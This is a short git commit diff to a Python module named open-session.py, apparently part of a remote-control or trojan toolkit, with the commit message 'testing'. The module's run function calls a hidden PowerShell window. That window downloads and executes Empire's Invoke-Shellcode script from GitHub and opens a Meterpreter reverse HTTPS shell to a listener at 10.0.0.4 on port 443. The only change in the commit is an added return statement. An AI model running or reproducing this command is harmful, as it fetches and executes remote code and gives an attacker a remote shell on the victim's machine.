4a9a122d84e9fb2e2128ea9e3daca53c9bcd655a
Omri Inbar <user@LAPTOP-M0KNH4BM>
2017-10-22 12:31:13 +0300

    testing

--- modules/open-session.py
+++ modules/open-session.py
@@ -2,3 +2,4 @@ import os
 def run(** args):
     print "[*] In Open-Session module."
     os.system("powershell -windowstyle hidden -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Lhost 10.0.0.4 -Lport 443 -Payload windows/meterpreter/reverse_https -Force")
+    return "Success"
